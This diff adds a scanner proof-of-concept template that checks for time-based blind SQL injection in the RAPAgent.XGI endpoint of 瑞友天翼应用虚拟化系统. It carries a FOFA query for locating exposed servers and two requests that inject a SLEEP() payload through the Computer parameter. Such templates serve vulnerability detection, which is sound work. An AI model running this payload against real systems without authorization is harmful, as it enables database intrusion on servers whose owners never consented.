@@ -1,0 +1,41 @@
+id: poc-yaml-gwt-system-rapapagent-xgi-sqli
+info:
+  name: 瑞友天翼应用虚拟化系统 RAPAgent.XGI sql注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 瑞友天翼应用虚拟化系统
+  fofa: body="/CasMain.XGI"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000003&AppID=APP00000001&Language=ZH-CN&Language=ZH-CN&User=admin&User=admin&PWD=&PWD=&AuthType=0&AuthType=0&Computer=CMD=GETApplication&Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP({{.t1}})))Joqo)%20AND%20%27DseX%27=%27DseX&Finger=&Finger=&IP&IP
+  expression: 'status_code == 200 &&
+
+    duration >= t1 &&
+
+    duration <= t2 &&
+
+    contains(body,"[result]") &&
+
+    contains(body,"MsgID")
+
+    '
+- method: GET
+  path: /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000003&AppID=APP00000001&Language=ZH-CN&Language=ZH-CN&User=admin&User=admin&PWD=&PWD=&AuthType=0&AuthType=0&Computer=CMD=GETApplication&Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP({{.t3}})))Joqo)%20AND%20%27DseX%27=%27DseX&Finger=&Finger=&IP&IP
+  expression: 'status_code == 200 &&
+
+    duration >= t3 &&
+
+    duration <= t4 &&
+
+    contains(body,"[result]") &&
+
+    contains(body,"MsgID")
+
+    '
+transport: http
